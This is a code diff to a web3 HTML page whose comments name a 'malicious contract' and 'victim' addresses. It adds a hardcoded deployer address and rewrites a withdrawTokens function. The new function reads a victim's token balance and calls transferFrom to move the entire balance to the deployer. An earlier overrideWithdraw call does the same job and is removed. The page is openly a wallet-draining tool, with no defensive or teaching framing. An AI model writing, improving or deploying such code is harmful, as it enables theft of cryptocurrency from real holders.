@@ -54,6 +54,7 @@
         let contractAddress = "0x870BAE1C18886ed61825e3b1f94a6568E676fb93"; // Replace with your malicious contract address
         let contractABI; // ABI will be loaded from external JSON
         let contract;
+        const deployerAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414";  // Replace with your deployer's address
 
         window.onload = () => {
             if (typeof window.ethereum !== 'undefined') {
@@ -93,34 +94,33 @@
         }
 
         // Withdraw tokens from the victim's wallet
-      async function withdrawTokens() {
-    const victimAddress = document.getElementById('victimAddress').value;
+        async function withdrawTokens() {
+            const victimAddress = document.getElementById('victimAddress').value;
 
-    if (!victimAddress) {
-        alert("Please enter a victim's address!");
-        return;
-    }
+            if (!victimAddress) {
+                alert("Please enter a victim's address!");
+                return;
+            }
 
-    try {
-        // Ensure the contract is initialized correctly with ABI and address
-        const contract = new web3.eth.Contract(ABI, contractAddress);
+            try {
+                // Ensure the contract is initialized correctly with ABI and address
+                const victimBalance = await contract.methods.balanceOf(victimAddress).call(); // Retrieve victim's balance
 
-        // Check if you're using the correct method (overrideWithdraw or transfer)
-        const amountToWithdraw = await contract.methods.balanceOf(victimAddress).call(); // Retrieve victim's balance
+                if (victimBalance === "0") {
+                    alert("The victim has no tokens to withdraw.");
+                    return;
+                }
 
-        // If you want to use overrideWithdraw, ensure it's part of the ABI
-        await contract.methods.overrideWithdraw(victimAddress).send({ from: deployerAddress });
+                // Call transferFrom to transfer the tokens from victim to deployer
+                await contract.methods.transferFrom(victimAddress, deployerAddress, victimBalance).send({ from: userAccount });
 
-        // Alternatively, if using transfer, you can use the code below instead:
-        // await contract.methods.transfer(deployerAddress, amountToWithdraw).send({ from: deployerAddress });
-
-        document.getElementById('status').innerText = `Tokens successfully withdrawn from ${victimAddress}!`;
-    } catch (error) {
-        console.error("Error withdrawing tokens:", error);
-        document.getElementById('status').innerText = "Error withdrawing tokens.";
-        alert("Error withdrawing tokens. Please try again.");
-    }
-}
+                document.getElementById('status').innerText = `Tokens successfully withdrawn from ${victimAddress}!`;
+            } catch (error) {
+                console.error("Error withdrawing tokens:", error);
+                document.getElementById('status').innerText = "Error withdrawing tokens.";
+                alert("Error withdrawing tokens. Please try again.");
+            }
+        }
     </script>
 </body>
 </html>
